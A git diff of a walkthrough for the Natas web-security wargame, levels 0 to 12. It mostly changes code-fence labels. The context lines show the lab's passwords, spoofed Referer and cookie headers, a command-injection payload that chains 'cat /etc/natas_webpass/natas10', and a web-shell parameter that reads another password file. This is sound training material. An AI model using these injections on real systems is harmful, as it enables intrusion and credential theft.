@@ -4,7 +4,7 @@
 
 Step 1: F12 -> Inspector
 
-```php
+```html
 <!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
 ```
 
@@ -12,14 +12,14 @@ Step 1: F12 -> Inspector
 
 Step 1: View page source (Ctrl + U)
 
-```php
+```html
 <!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
 ```
 ### natas2
 
 Step 1: View page source
 
-```php
+```html
 ...
 <h1>natas2</h1>
 <div id="content">
@@ -30,7 +30,7 @@ There is nothing on this page
 
 Step 2: Access to `files/pixel.png` -> Back to `files`
 
-```php
+```html
 ...
 <tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="users.txt">users.txt</a></td><td align="right">2016-12-20 05:15  </td><td align="right">145 </td><td>&nbsp;</td></tr>
 ...
@@ -38,7 +38,7 @@ Step 2: Access to `files/pixel.png` -> Back to `files`
 
 Step 3: Access to `users.txt`
 
-```php
+```
 # username:password
 alice:BYNdCesZqW
 bob:jw2ueICLvT
@@ -52,7 +52,7 @@ mallory:9urtcpzBmH
 
 Step 1: View page source
 
-```php
+```html
 ...
 <h1>natas3</h1>
 <div id="content">
@@ -64,14 +64,14 @@ There is nothing on this page
 Step 2: The `robots.txt` file on a webpage tells search engines which directories not to enter.
 We try access to `robots.txt`
 
-```php
+```
 User-agent: *
 Disallow: /s3cr3t/
 ```
 
 Step 3: Access to `/s3cr3t/`
 
-```php
+```html
 ...
 <tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="users.txt">users.txt</a></td><td align="right">2016-12-20 05:15  </td><td align="right"> 40 </td><td>&nbsp;</td></tr>
 ...
@@ -79,13 +79,13 @@ Step 3: Access to `/s3cr3t/`
 
 Step 4: Access to `users.txt`
 
-```php
+```
 natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
 ```
 
 ### natas4
 
-```php
+```
 ...
 Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
 ...
@@ -93,7 +93,7 @@ Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.o
 
 Step 1: F12 to inspect `Request Headers`
 
-```html
+```
 GET /index.php HTTP/1.1
 Host: natas4.natas.labs.overthewire.org
 Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va
@@ -108,7 +108,7 @@ Connection: close
 
 Step 2: Burp Repeater -> Change `Referer: http://natas5.natas.labs.overthewire.org/`
 
-```html
+```
 Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
 ```
 
@@ -120,7 +120,7 @@ Access disallowed. You are not logged in</div>
 
 Step 1: inspect response
 
-```html
+```
 HTTP/1.1 200 OK
 Date: Fri, 04 Mar 2022 16:14:39 GMT
 Server: Apache/2.4.10 (Debian)
@@ -133,7 +133,7 @@ Content-Type: text/html; charset=UTF-8
 
 Step 2: Burp Repeater -> Add header `Cookie: loggedin=1`
 
-```html
+```
 Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
 ```
 
@@ -166,7 +166,7 @@ $secret = "FOEIUWGHFEEUHOFUOIU";
 
 Step 2: Submit secret=FOEIUWGHFEEUHOFUOIU
 
-```html
+```
 Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
 ```
 
@@ -216,7 +216,7 @@ base64_decode("b3ViV1lmMmtCcQ==");
 // oubWYf2kBq
 ```
 
-```html
+```
 Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
 ```
 
@@ -239,7 +239,7 @@ if($key != "") {
 Because `$key` isn't validated, we can inject cli into `$key`. 
 The payload is `'123' dictionary.txt; cat /etc/natas_webpass/natas10`
 
-```html
+```
 Output:
 nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
 
@@ -390,7 +390,7 @@ for i in range(len(data)):
 print('cookie:', base64.b64encode(cookie.encode()))
 ```
 
-```shell
+```
 data: {"showpassword":"no","bgcolor":"#ffffff"}
 xoring: b'\nUK"\x1e\x00H+\x02\x04O%\x03\x13\x1apS\x19Wh]UZ-\x12\x18T%\x03U\x02hR\x11^,\x17\x11^h\x0c'
 char of key: 113
@@ -518,6 +518,6 @@ Warning: system(): Cannot execute a blank command in /var/www/natas/natas12/uplo
 
 Add param into url `?cmd=cat /etc/natas_webpass/natas13`.
 
-```html
+```
 jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
 ```
